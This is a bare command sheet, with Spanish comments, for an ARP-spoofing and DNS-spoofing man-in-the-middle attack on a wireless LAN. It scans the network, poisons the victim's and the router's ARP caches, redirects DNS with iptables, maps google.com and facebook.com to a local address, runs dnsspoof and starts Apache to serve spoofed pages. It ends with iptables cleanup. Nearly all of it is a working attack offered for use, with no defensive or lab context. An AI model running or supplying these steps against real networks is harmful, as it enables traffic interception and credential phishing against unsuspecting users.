#no modo monitor

sysctl -w net.ipv4.ip_forward=1

sudo arp-scan --interface=wlan0 --localnet

sudo arpspoof -i wlan0 -t [IP_VICTIMA] [IP_ROUTER]
sudo arpspoof -i wlan0 -t [IP_ROUTER] [IP_VICTIMA]

sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

echo -ne "192.168.1.100\twww.google.com\n192.168.1.100\tfacebook.com"

dnsspoof -i wlan0 -f hosts.txt

systemctl start apache2

#limpiar
iptables --flush
iptables -t nat --flush
